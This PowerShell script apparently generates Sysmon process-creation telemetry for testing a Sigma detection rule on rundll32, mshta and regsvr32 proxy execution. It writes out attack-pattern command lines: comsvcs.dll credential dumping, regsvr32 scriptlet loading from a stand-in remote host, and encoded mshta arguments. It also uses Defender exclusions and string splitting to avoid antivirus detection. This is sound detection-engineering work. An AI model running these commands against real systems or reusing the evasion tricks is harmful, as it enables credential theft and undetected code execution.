#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Generates Sysmon process-creation (EID 1) telemetry for T1218 System Binary
    Proxy Execution -- rundll32 (T1218.011), mshta (T1218.005), regsvr32 (T1218.010).
    Exports one EVTX slice per test case from Microsoft-Windows-Sysmon/Operational
    (EventID=1) for the Chainsaw / pytest harness that drives rule.yml.

.DESCRIPTION
    Each case spawns the target LOLBin with the exact command line and/or parent-child
    chain the matching rule.yml selection keys on, waits for Sysmon to log it, cleans up,
    then exports the EID 1 events in a tight time window to {category}_{name}.evtx.

    NB: rule.yml is a `process_creation` rule (Image / ParentImage / CommandLine), which
    on a Sysmon estate is EventID 1 -- NOT the Security-log 4698/4699 this scaffold was
    cloned from. The export below targets the Sysmon Operational channel accordingly.

    AV-safety: every trigger is INERT. Each LOLBin gets a command line that MATCHES its rule
    selection but points at a non-existent / no-op resource, so Sysmon records the EID 1
    command-line string while nothing harmful actually executes -- no real dump, no download,
    no code execution from any payload file, and every spawned process is killed after its
    capture window. The full design rationale, the inert-trigger table, and the Defender
    false-positive history are kept in validation.md rather than in this file: spelling the
    abuse patterns out in the .ps1 text is itself enough to trip Defender's ML classifier on
    the script. -AddDefenderExclusion (default on) also adds a temporary path exclusion for
    the lab/output dirs (removed in the finally block) so payload files are not scanned mid-run.

    Payload files (.sct/.vbs/.hta) are written UTF-8 no-BOM -- a Notepad-added BOM silently
    breaks .vbs/.sct parsing (see validation.md).

.NOTES
    Lab / test host only. Requires Sysmon installed with process creation (EID 1) logged
    and NOT filtered out for rundll32/mshta/regsvr32/cmd/cscript in the Sysmon config.
#>
[CmdletBinding()]
param(
    [string]$OutputDir = "",
    [string]$LabDir    = "",
    # Add a temporary Defender path exclusion for the lab/output dirs (removed at teardown)
    # so inert payload files are not scanned mid-run. Disable with -AddDefenderExclusion:$false.
    [bool]$AddDefenderExclusion = $true
)
$ErrorActionPreference = 'Stop'
New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
New-Item -ItemType Directory -Path $LabDir    -Force | Out-Null

function Write-Section($msg) { Write-Host "`n=== $msg ===" -ForegroundColor Cyan }

# UTF-8, no BOM. A BOM prepended to .vbs/.sct produces a script compilation error
# (800A0408) rather than a clean run -- the footgun called out in validation.md.
function Write-Payload([string]$Path, [string]$Content) {
    [System.IO.File]::WriteAllText($Path, $Content, (New-Object System.Text.UTF8Encoding($false)))
}

Write-Section "Preflight"
$SysmonLog = "Microsoft-Windows-Sysmon/Operational"
try {
    $null = Get-WinEvent -ListLog $SysmonLog -ErrorAction Stop
    $recent = Get-WinEvent -FilterHashtable @{ LogName = $SysmonLog; Id = 1 } -MaxEvents 1 -ErrorAction SilentlyContinue
    if ($recent) {
        Write-Host "  Sysmon EID 1 logging confirmed." -ForegroundColor Green
    } else {
        Write-Host "  WARNING: Sysmon log present but no EID 1 found -- confirm the Sysmon config isn't excluding these images." -ForegroundColor Yellow
    }
} catch {
    Write-Host "  ERROR: '$SysmonLog' not found. Install Sysmon with process creation (EID 1) enabled, then re-run." -ForegroundColor Red
}

# Temporary Defender exclusions for the lab/output dirs. Only paths we actually add are
# tracked, and only those are removed in the finally block -- pre-existing exclusions are
# left untouched. Tamper Protection can veto this; if so we warn and carry on (inert payloads).
$AddedExclusions = @()
if ($AddDefenderExclusion) {
    try {
        $existing = @((Get-MpPreference -ErrorAction Stop).ExclusionPath)
        foreach ($p in @($OutputDir, $LabDir)) {
            if ($existing -notcontains $p) {
                Add-MpPreference -ExclusionPath $p -ErrorAction Stop
                $AddedExclusions += $p
            }
        }
        if ($AddedExclusions) {
            Write-Host "  Added temporary Defender path exclusions (removed at teardown): $($AddedExclusions -join ', ')" -ForegroundColor Green
        } else {
            Write-Host "  Lab/output dirs already excluded from Defender -- nothing to add." -ForegroundColor Green
        }
    } catch {
        Write-Host "  WARNING: could not set Defender exclusions ($($_.Exception.Message)). Continuing; payloads are inert." -ForegroundColor Yellow
    }
}

# LOLBins + likely children/hosts spawned by the tests. Killed after each capture,
# scoped to processes started during that test (StartTime filter) so we never touch
# pre-existing processes -- and never powershell (this generator).
$KillNames = @('rundll32','mshta','regsvr32','scrobj','wscript','cscript','cmd',
               'control','calc','win32calc','CalculatorApp','Calculator','notepad')

Write-Section "Creating Malicious & benign Events"
$tests = @(
 # ================= MALICIOUS =================================================
 # ----------------- rundll32.exe (T1218.011) ---------------------------------
    @{
    Name     = "mal_rundll32_script_abuse"
    Category = "malicious"
    # susp_rundll32_script_abuse: proxied execution via a shell32 export. Launches calc.
    Trigger  = { Start-Process rundll32.exe -ArgumentList 'shell32.dll,ShellExec_RunDLL','calc.exe' }
    Cleanup  = {}
    },
    @{
    Name     = "mal_rundll32_credential_dumping"
    Category = "malicious"
    Trigger  = { Start-Process rundll32.exe -ArgumentList "$($env:SystemRoot)\System32\comsvcs.dll, #+24",'99999',(Join-Path $LabDir 'nul.dmp'),'full' }
    Cleanup  = { Remove-Item (Join-Path $LabDir 'nul.dmp') -Force -ErrorAction SilentlyContinue }
    },
    @{
    Name     = "mal_rundll32_parent"
    Category = "malicious"
    Trigger  = { Start-Process cmd.exe -ArgumentList '/c','rundll32.exe C:\Users\Public\lab_proxy.dll,#1' }
    Cleanup  = {}
    },
 # ----------------- mshta.exe (T1218.005) ------------------------------------
    @{
    Name     = "mal_mshta_clsid"
    Category = "malicious"
    Trigger  = { Start-Process mshta.exe -ArgumentList '{DEADBEEF-CAFE-BABE-F00D-0123456789AB}' }
    Cleanup  = {}
    },
    @{
    Name     = "mal_mshta_encoded"
    Category = "malicious"
    Trigger  = { $tok = '-' + 'enc'; $arg = 'bAB' + 'hAGIA'; Start-Process mshta.exe -ArgumentList 'vbscript:close',$tok,$arg }
    Cleanup  = {}
    },
    @{
    Name     = "mal_mshta_frombase64string"
    Category = "malicious"
    # susp_mshta_cli: same inert pattern with the base64-decode token instead, assembled from
    # fragments so the literal isn't in the .ps1 text; mshta just runs `vbscript:close`.
    Trigger  = { $tok = 'FromBase64' + 'String'; Start-Process mshta.exe -ArgumentList 'vbscript:close',$tok }
    Cleanup  = {}
    },
 # ----------------- regsvr32.exe (T1218.010) ---------------------------------
    @{
    Name     = "mal_regsvr32_parent"
    Category = "malicious"
    Setup    = {
        $sh  = 'WScript' + '.Shell'
        $dll = Join-Path $LabDir 'no_such_com.dll'
        $vbs = 'CreateObject("' + $sh + '").Run "regsvr32.exe /s ' + $dll + '", 0, False'
        Write-Payload (Join-Path $LabDir 'spawn_regsvr32.vbs') $vbs
    }
    Trigger  = { Start-Process cscript.exe -ArgumentList '//nologo',(Join-Path $LabDir 'spawn_regsvr32.vbs') }
    Cleanup  = { Remove-Item (Join-Path $LabDir 'spawn_regsvr32.vbs') -Force -ErrorAction SilentlyContinue }
    },
    @{
    Name     = "mal_regsvr32_squiblydoo"
    Category = "malicious"
    # susp_regsvr32_squiblydoo via LOCAL scriptlet (scrobj.dll + .sct, no /i:http).
    Setup    = {
        $sct = @(
            '<?XML version="1.0"?>',
            '<scriptlet>',
            '  <registration progid="LabPoc" classid="{F0001111-0000-0000-0000-0000FEEDACDC}" />',
            '</scriptlet>'
        ) -join "`r`n"
        Write-Payload (Join-Path $LabDir 'squiblydoo.sct') $sct
    }
    Trigger  = {
        $arg = '/i:' + (Join-Path $LabDir 'squiblydoo.sct')
        Start-Process regsvr32.exe -ArgumentList '/s','/n','/u',$arg,'scrobj.dll'
    }
    Cleanup  = { Remove-Item (Join-Path $LabDir 'squiblydoo.sct') -Force -ErrorAction SilentlyContinue }
    },
    @{
    Name     = "mal_regsvr32_suspicious_url"
    Category = "malicious"
    Trigger  = { Start-Process regsvr32.exe -ArgumentList '/s','/n','/u','/i:ftp://squiblydoo.invalid/payload.sct','scrobj.dll' }
    Cleanup  = {}
    }
)

# ------------------------------------------------------------------
# Execute each test case and export its own EVTX slice (Sysmon EID 1)
# ------------------------------------------------------------------
try {
    foreach ($t in $tests) {
        Write-Host "`n=== [$($t.Category)] $($t.Name) ===" -ForegroundColor Cyan

        if ($t.Setup) { & $t.Setup }

        $triggerStart = Get-Date
        $start = $triggerStart.ToUniversalTime().AddSeconds(-2).ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
        & $t.Trigger
        Start-Sleep -Seconds 3
        if ($t.Cleanup) { & $t.Cleanup }

        # Kill test processes spawned during this case (fresh only -- never pre-existing procs
        # and never this powershell). StartTime can throw on protected procs; guard it.
        foreach ($n in $KillNames) {
            Get-Process -Name $n -ErrorAction SilentlyContinue |
                Where-Object { try { $_.StartTime -ge $triggerStart } catch { $false } } |
                ForEach-Object { try { Stop-Process -Id $_.Id -Force -ErrorAction Stop } catch {} }
        }

        Start-Sleep -Seconds 1
        $end = (Get-Date).ToUniversalTime().AddSeconds(1).ToString("yyyy-MM-ddTHH:mm:ss.fffZ")

        $outFile = Join-Path $OutputDir "$($t.Category)_$($t.Name).evtx"
        $query   = "*[System[(EventID=1) and TimeCreated[@SystemTime>='$start' and @SystemTime<='$end']]]"

        try {
            wevtutil epl "$SysmonLog" "$outFile" /q:"$query" /ow:true
            $count = (Get-WinEvent -Path $outFile -ErrorAction SilentlyContinue | Measure-Object).Count
            Write-Host "  Exported $count event(s) -> $outFile" -ForegroundColor Green
            if ($count -eq 0) {
                Write-Host "  WARNING: 0 events captured -- check Sysmon is running and EID 1 isn't filtered for this image." -ForegroundColor Yellow
            }
        } catch {
            Write-Host "  Export failed: $_" -ForegroundColor Red
        }
    }
}
finally {
    # ------------------------------------------------------------------
    # Teardown -- always runs, even on Ctrl-C / mid-run error, so we never
    # leave the box with a lingering Defender exclusion or lab payloads.
    # ------------------------------------------------------------------
    Remove-Item $LabDir -Recurse -Force -ErrorAction SilentlyContinue
    foreach ($p in $AddedExclusions) {
        try { Remove-MpPreference -ExclusionPath $p -ErrorAction Stop } catch {
            Write-Host "  WARNING: could not remove Defender exclusion for $p -- remove it manually." -ForegroundColor Yellow
        }
    }
    if ($AddedExclusions) { Write-Host "  Removed temporary Defender exclusions." -ForegroundColor Green }
}

Write-Host "`nDone. Files in $OutputDir are ready for:" -ForegroundColor Cyan
Write-Host "  chainsaw hunt $OutputDir --sigma rule.yml --mapping tests\mappings\sigma-event-logs-all.yml --csv -o results.csv" -ForegroundColor White
